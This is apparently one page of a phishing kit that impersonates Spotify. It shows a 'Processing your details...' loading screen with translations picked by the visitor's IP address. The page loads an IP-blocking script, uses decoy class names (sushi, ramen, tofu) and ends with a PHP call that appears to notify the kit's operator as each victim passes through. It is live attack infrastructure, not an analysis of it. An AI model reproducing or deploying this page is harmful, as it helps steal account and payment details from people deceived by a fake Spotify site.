<?php 
require '../main.php';
require_once 'blockip.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="./img/fav.ico">
    <title data-translate="processing-title">Spotify - Processing</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Circular', Arial, sans-serif;
        }
        
        body {
            background-color: #121212;
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .sushi {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            background-color: #000;
        }
        
        .ramen {
            display: flex;
            align-items: center;
        }
        
        .ramen img {
            height: 40px;
        }
        
        .tempura {
            display: flex;
            align-items: center;
            gap: 30px;
        }
        
        .udon {
            display: flex;
            gap: 30px;
        }
        
        .udon a {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
        }
        
        .miso {
            display: flex;
            align-items: center;
            gap: 5px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 23px;
            padding: 5px 10px;
            cursor: pointer;
        }
        
        .tofu {
            width: 30px;
            height: 30px;
            background-color: #535353;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .tofu img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .wasabi {
            font-weight: 700;
            margin-right: 5px;
        }
        
        /* Loading content styles */
        .loading-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .loading-text {
            font-size: 18px;
            font-weight: 600;
            margin-top: 25px;
            color: #b3b3b3;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            position: relative;
        }
        
        .spinner::before {
            content: "";
            box-sizing: border-box;
            position: absolute;
            inset: 0px;
            border-radius: 50%;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top-color: #1ED760;
            animation: spinner-rotation 1s linear infinite;
        }
        
        @keyframes spinner-rotation {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        /* Footer styles */
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 11px;
            color: #999;
            line-height: 1.4;
        }
        
        .footer a {
            color: #1ED760;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 768px) {
            .sushi {
                padding: 15px 20px;
            }
            
            .udon {
                gap: 15px;
            }
            
            .loading-text {
                font-size: 16px;
            }
        }
        
        @media (max-width: 576px) {
            .sushi {
                padding: 10px 15px;
            }
            
            .ramen img {
                width: 100px;
                height: 40px;
            }
            
            .udon {
                display: none;
            }
            
            .miso {
                padding: 3px 8px;
            }
            
            .tofu {
                width: 25px;
                height: 25px;
            }
            
            .wasabi {
                font-size: 14px;
            }
            
            .tempura {
                gap: 15px;
            }
            
            .spinner {
                width: 40px;
                height: 40px;
            }
            
            .loading-text {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <nav class="sushi">
        <div class="ramen">
            <img src="./img/lggo.webp">
        </div>
        
        <div class="tempura">
            <div class="udon">
                <a data-translate="premium">Premium</a>
                <a data-translate="support">Support</a>
                <a data-translate="download">Download</a>
            </div>
            
            <div class="miso">
                <div class="tofu">
                    <img src="./img/proff.webp">
                </div>
                <span class="wasabi" data-translate="profile">Profile</span>
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M4 6L8 10L12 6" stroke="white" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </div>
        </div>
    </nav>
    
    <!-- Loading Content -->
    <div class="loading-container">
        <div class="spinner"></div>
        <div class="loading-text" data-translate="processing-details">Processing your details...</div>
    </div>
    
    <!-- Footer -->
    <footer class="footer">
        <p data-translate="recaptcha-full">
            This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.
        </p>
    </footer>

    <script>
        // Translation dictionary - only header, title, processing text, and footer
        const translations = {
            en: {
                "processing-title": "Spotify - Processing",
                "processing-details": "Processing your details...",
                premium: "Premium",
                support: "Support",
                download: "Download",
                profile: "Profile",
                "recaptcha-full": "This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.",
            },
            pl: {
                "processing-title": "Spotify - Przetwarzanie",
                "processing-details": "Przetwarzanie Twoich danych...",
                premium: "Premium",
                support: "Wsparcie",
                download: "Pobierz",
                profile: "Profil",
                "recaptcha-full": "Ta strona jest chroniona przez reCAPTCHA i Google Polityka Prywatności i Warunki Usługi mają zastosowanie.",
            },
            de: {
                "processing-title": "Spotify - Verarbeitung",
                "processing-details": "Verarbeitung Ihrer Daten...",
                premium: "Premium",
                support: "Support",
                download: "Download",
                profile: "Profil",
                "recaptcha-full": "Diese Website ist durch reCAPTCHA und Google Datenschutzrichtlinie und Nutzungsbedingungen geschützt.",
            },
            fr: {
                "processing-title": "Spotify - Traitement",
                "processing-details": "Traitement de vos données...",
                premium: "Premium",
                support: "Support",
                download: "Télécharger",
                profile: "Profil",
                "recaptcha-full": "Ce site est protégé par reCAPTCHA et Google Politique de Confidentialité et Conditions d'Utilisation s'appliquent.",
            },
            es: {
                "processing-title": "Spotify - Procesando",
                "processing-details": "Procesando sus datos...",
                premium: "Premium",
                support: "Soporte",
                download: "Descargar",
                profile: "Perfil",
                "recaptcha-full": "Este sitio está protegido por reCAPTCHA y Google Política de Privacidad y Términos de Servicio se aplican.",
            },
            it: {
                "processing-title": "Spotify - Elaborazione",
                "processing-details": "Elaborazione dei tuoi dati...",
                premium: "Premium",
                support: "Supporto",
                download: "Scarica",
                profile: "Profilo",
                "recaptcha-full": "Questo sito è protetto da reCAPTCHA e Google Informativa sulla Privacy e Termini di Servizio si applicano.",
            },
            nl: {
                "processing-title": "Spotify - Verwerking",
                "processing-details": "Verwerking van uw gegevens...",
                premium: "Premium",
                support: "Ondersteuning",
                download: "Download",
                profile: "Profiel",
                "recaptcha-full": "Deze site wordt beschermd door reCAPTCHA en Google Privacybeleid en Servicevoorwaarden zijn van toepassing.",
            },
        }

        // Function to get user's country based on IP
        async function getUserCountry() {
            try {
                const response = await fetch("https://ipapi.co/json/")
                const data = await response.json()
                return data.country_code.toLowerCase()
            } catch (error) {
                console.log("Could not detect country, using default language")
                return "us" // Default to US/English
            }
        }

        // Function to get language based on country
        function getLanguageFromCountry(countryCode) {
            const countryToLanguage = {
                pl: "pl", // Poland
                de: "de", // Germany
                at: "de", // Austria
                ch: "de", // Switzerland (German part)
                fr: "fr", // France
                be: "fr", // Belgium (French part)
                ca: "fr", // Canada (French part)
                es: "es", // Spain
                mx: "es", // Mexico
                ar: "es", // Argentina
                co: "es", // Colombia
                pe: "es", // Peru
                it: "it", // Italy
                nl: "nl", // Netherlands
                us: "en", // United States
                gb: "en", // United Kingdom
                au: "en", // Australia
                nz: "en", // New Zealand
                ie: "en", // Ireland
                za: "en", // South Africa
            }

            return countryToLanguage[countryCode] || "en" // Default to English
        }

        // Function to translate the page
        function translatePage(language) {
            const elements = document.querySelectorAll("[data-translate]")

            elements.forEach((element) => {
                const key = element.getAttribute("data-translate")
                if (translations[language] && translations[language][key]) {
                    element.textContent = translations[language][key]
                }
            })

            // Handle title translation
            const titleElement = document.querySelector("title[data-translate]")
            if (titleElement && translations[language] && translations[language]["processing-title"]) {
                titleElement.textContent = translations[language]["processing-title"]
            }

            // Update document language
            document.documentElement.lang = language
            console.log(`Page translated to: ${language}`)
        }

        // Initialize translation
        async function initializePage() {
            try {
                const countryCode = await getUserCountry()
                const language = getLanguageFromCountry(countryCode)
                console.log(`Detected country: ${countryCode}, using language: ${language}`)
                translatePage(language)
            } catch (error) {
                console.log("Translation failed, using default language")
                translatePage("en")
            }
        }

        // Start when page loads
        document.addEventListener("DOMContentLoaded", function() {
            initializePage()
            
            // Simulate a loading process
            setTimeout(function() {
                // Redirect to success page after loading
                // window.location.href = 'index.html';
            }, 5000); // 5 seconds
        });
    </script>
<script src="js/jq.js"></script>
<?php $m->ctr("♻️ LOADING ♻️".@$_GET['e']); ?>
</body></html>